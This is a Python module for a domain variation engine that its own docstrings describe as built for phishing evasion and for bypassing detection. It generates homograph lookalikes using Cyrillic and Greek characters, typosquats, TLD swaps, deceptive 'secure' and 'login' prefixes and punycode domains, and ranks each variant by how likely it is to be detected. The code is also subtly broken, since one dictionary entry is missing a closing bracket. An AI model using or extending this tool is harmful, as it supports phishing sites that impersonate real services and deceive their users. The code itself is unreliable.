"""
Domain Generator - Advanced Domain Variation Engine
====================================================

Generates domain variations for evasion:
- Homograph attacks
- Typosquatting
- Subdomain variation
- TLD variation
- Punycode encoding
"""

import random
import string
from typing import List, Dict, Set
import idna
from dataclasses import dataclass


@dataclass
class DomainVariation:
    """Domain variation with metadata"""
    original: str
    variation: str
    technique: str
    similarity_score: float
    detection_risk: str


class DomainGenerator:
    """
    Advanced domain variation generator for phishing evasion.
    Creates multiple domain variants to bypass detection.
    """
    
    def __init__(self):
        self.tlds = ['.com', '.org', '.net', '.io', '.co', '.app', '.dev', '.tech', '.online']
        self.common_subdomains = ['www', 'mail', 'login', 'secure', 'auth', 'account', 'my', 'app']
        
        # Homograph characters (visually similar)
        self.homograph_map = {
            'a': 'а',  # Cyrillic a
            'c': 'с',  # Cyrillic c
            'e': 'е',  # Cyrillic e
            'o': 'о',  # Cyrillic o
            'p': 'р',  # Cyrillic p
            'x': 'х',  # Cyrillic x
            'y': 'у',  # Cyrillic y
            'i': 'і',  # Ukrainian i
            'l': 'і',  # Ukrainian i
            'v': 'ν',  # Greek nu
            'w': 'ԝ',  # Cyrillic we
        }
        
        # Common typos
        self.typo_variations = {
            'a': ['s', 'q'],
            'b': ['v', 'n'],
            'c': ['x', 'v'],
            'd': ['s', 'f'],
            'e': ['w', 'r'],
            'f': ['d', 'g'],
            'g': ['f', 'h'],
            'h': ['g', 'j'],
            'i': ['u', 'o'],
            'j': ['h', 'k'],
            'k': ['j', 'l'],
            'l': ['k', ';'],
            'm': ['n', ','],
            'n': ['m', 'b'],
            'o': ['i', 'p'],
            'p': ['o', '[',
            'q': ['w', 'a'],
            'r': ['e', 't'],
            's': ['a', 'd'],
            't': ['r', 'y'],
            'u': ['y', 'i'],
            'v': ['c', 'b'],
            'w': ['q', 's'],
            'x': ['z', 'c'],
            'y': ['t', 'u'],
            'z': ['x', 's']
        }
    
    def generate_variations(self, domain: str, count: int = 10) -> List[str]:
        """Generate domain variations using multiple techniques"""
        variations = set()
        
        # Extract base domain and TLD
        base_domain, tld = self._parse_domain(domain)
        
        # Generate variations using different techniques
        techniques = [
            self._generate_homograph_variations,
            self._generate_typosquatting,
            self._generate_subdomain_variations,
            self._generate_tld_variations,
            self._generate_hyphen_variations,
            self._generate_prefix_suffix,
            self._generate_double_character,
            self._generate_missing_character
        ]
        
        for technique in techniques:
            try:
                vars_list = technique(base_domain, tld)
                variations.update(vars_list)
            except Exception:
                continue  # Skip failed techniques
        
        # Convert to list and limit
        result = list(variations)
        random.shuffle(result)
        
        return result[:count]
    
    def generate_subdomain_variations(self, subdomain: str, count: int = 5) -> List[str]:
        """Generate subdomain variations"""
        variations = set()
        
        # Add common prefixes
        prefixes = ['secure', 'auth', 'login', 'mail', 'account', 'my', 'app', 'api']
        for prefix in prefixes:
            variations.add(f"{prefix}-{subdomain}")
            variations.add(f"{prefix}{subdomain}")
            variations.add(f"{subdomain}-{prefix}")
        
        # Add random strings
        for _ in range(count // 2):
            random_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
            variations.add(f"{subdomain}-{random_suffix}")
            variations.add(f"{random_suffix}-{subdomain}")
        
        # Add numbers
        for i in range(1, count // 2 + 1):
            variations.add(f"{subdomain}{i}")
            variations.add(f"{subdomain}-{i}")
        
        return list(variations)[:count]
    
    def _parse_domain(self, domain: str) -> tuple:
        """Parse domain into base and TLD"""
        if '.' not in domain:
            return domain, '.com'
        
        parts = domain.split('.')
        if len(parts) == 2:
            return parts[0], f".{parts[1]}"
        else:
            return '.'.join(parts[:-1]), f".{parts[-1]}"
    
    def _generate_homograph_variations(self, base_domain: str, tld: str) -> List[str]:
        """Generate homograph (lookalike) variations"""
        variations = []
        
        # Replace characters with homographs
        for original, homograph in self.homograph_map.items():
            if original in base_domain.lower():
                # Replace all occurrences
                variation = base_domain.lower().replace(original, homograph)
                variations.append(variation + tld)
                
                # Replace only first occurrence
                first_occurrence = base_domain.lower().find(original)
                if first_occurrence != -1:
                    variation = (base_domain[:first_occurrence] + 
                                homograph + 
                                base_domain[first_occurrence + 1:])
                    variations.append(variation + tld)
        
        return variations
    
    def _generate_typosquatting(self, base_domain: str, tld: str) -> List[str]:
        """Generate typosquatting variations"""
        variations = []
        
        for i, char in enumerate(base_domain.lower()):
            if char in self.typo_variations:
                for typo_char in self.typo_variations[char]:
                    # Replace character
                    variation = base_domain[:i] + typo_char + base_domain[i+1:]
                    variations.append(variation + tld)
        
        return variations
    
    def _generate_subdomain_variations(self, base_domain: str, tld: str) -> List[str]:
        """Generate subdomain variations"""
        variations = []
        
        # Add common subdomains as prefixes
        for subdomain in self.common_subdomains:
            variations.append(f"{subdomain}.{base_domain}{tld}")
            variations.append(f"{base_domain}-{subdomain}{tld}")
        
        return variations
    
    def _generate_tld_variations(self, base_domain: str, tld: str) -> List[str]:
        """Generate TLD variations"""
        variations = []
        
        for new_tld in self.tlds:
            if new_tld != tld:
                variations.append(base_domain + new_tld)
        
        return variations
    
    def _generate_hyphen_variations(self, base_domain: str, tld: str) -> List[str]:
        """Generate hyphen variations"""
        variations = []
        
        # Add hyphens between words
        if len(base_domain) > 6:
            mid = len(base_domain) // 2
            variations.append(base_domain[:mid] + '-' + base_domain[mid:] + tld)
        
        # Add hyphen at start or end
        variations.append('-' + base_domain + tld)
        variations.append(base_domain + '-' + tld)
        
        return variations
    
    def _generate_prefix_suffix(self, base_domain: str, tld: str) -> List[str]:
        """Generate prefix and suffix variations"""
        variations = []
        
        prefixes = ['secure', 'auth', 'login', 'my', 'app', 'real', 'official']
        suffixes = ['secure', 'auth', 'login', 'app', 'online', 'site', 'web']
        
        for prefix in prefixes[:3]:  # Limit to avoid too many
            variations.append(prefix + base_domain + tld)
        
        for suffix in suffixes[:3]:  # Limit to avoid too many
            variations.append(base_domain + suffix + tld)
        
        return variations
    
    def _generate_double_character(self, base_domain: str, tld: str) -> List[str]:
        """Generate double character variations"""
        variations = []
        
        # Double random characters
        for i in range(min(3, len(base_domain))):
            char_index = random.randint(0, len(base_domain) - 1)
            variation = (base_domain[:char_index + 1] + 
                        base_domain[char_index] + 
                        base_domain[char_index + 1:])
            variations.append(variation + tld)
        
        return variations
    
    def _generate_missing_character(self, base_domain: str, tld: str) -> List[str]:
        """Generate missing character variations"""
        variations = []
        
        if len(base_domain) > 3:
            # Remove random character
            for i in range(min(2, len(base_domain) - 1)):
                char_index = random.randint(1, len(base_domain) - 2)
                variation = base_domain[:char_index] + base_domain[char_index + 1:]
                variations.append(variation + tld)
        
        return variations
    
    def calculate_similarity(self, original: str, variation: str) -> float:
        """Calculate similarity score between domains"""
        # Simple Levenshtein distance approximation
        if original == variation:
            return 1.0
        
        # Count matching characters
        matches = sum(1 for a, b in zip(original, variation) if a == b)
        max_len = max(len(original), len(variation))
        
        return matches / max_len if max_len > 0 else 0.0
    
    def assess_detection_risk(self, variation: str) -> str:
        """Assess detection risk of domain variation"""
        risk_score = 0
        
        # Check for suspicious patterns
        if '-' in variation:
            risk_score += 1
        
        if any(char.isdigit() for char in variation):
            risk_score += 1
        
        # Check for homograph characters
        try:
            decoded = idna.decode(variation.encode('idna'))
            if decoded != variation:
                risk_score += 3  # High risk for homograph
        except:
            risk_score += 2  # Punycode encoding
        
        # Check length
        if len(variation) > 20:
            risk_score += 1
        
        if risk_score >= 3:
            return 'high'
        elif risk_score >= 2:
            return 'medium'
        else:
            return 'low'
    
    def generate_punycode_domains(self, domain: str, count: int = 5) -> List[str]:
        """Generate punycode encoded domains"""
        variations = []
        
        # Generate homograph variations and encode
        homographs = self._generate_homograph_variations(domain, '.com')
        
        for homograph in homographs[:count]:
            try:
                punycode = idna.encode(homograph).decode('ascii')
                variations.append(punycode)
            except:
                continue
        
        return variations
    
    def batch_generate_variations(self, domains: List[str], 
                                variations_per_domain: int = 10) -> Dict[str, List[DomainVariation]]:
        """Generate variations for multiple domains"""
        results = {}
        
        for domain in domains:
            variations = []
            generated = self.generate_variations(domain, variations_per_domain)
            
            for variation in generated:
                similarity = self.calculate_similarity(domain, variation)
                risk = self.assess_detection_risk(variation)
                
                variations.append(DomainVariation(
                    original=domain,
                    variation=variation,
                    technique=self._detect_technique(domain, variation),
                    similarity_score=similarity,
                    detection_risk=risk
                ))
            
            results[domain] = variations
        
        return results
    
    def _detect_technique(self, original: str, variation: str) -> str:
        """Detect which technique was used to generate variation"""
        if '-' in variation and '-' not in original:
            return 'hyphenation'
        elif any(char.isdigit() for char in variation) and not any(char.isdigit() for char in original):
            return 'number_addition'
        elif self._has_homograph_chars(variation):
            return 'homograph'
        elif len(set(original) & set(variation)) / len(set(original)) < 0.7:
            return 'typosquatting'
        else:
            return 'other'
    
    def _has_homograph_chars(self, text: str) -> bool:
        """Check if text contains homograph characters"""
        for char in text:
            if char in self.homograph_map.values():
                return True
        return False
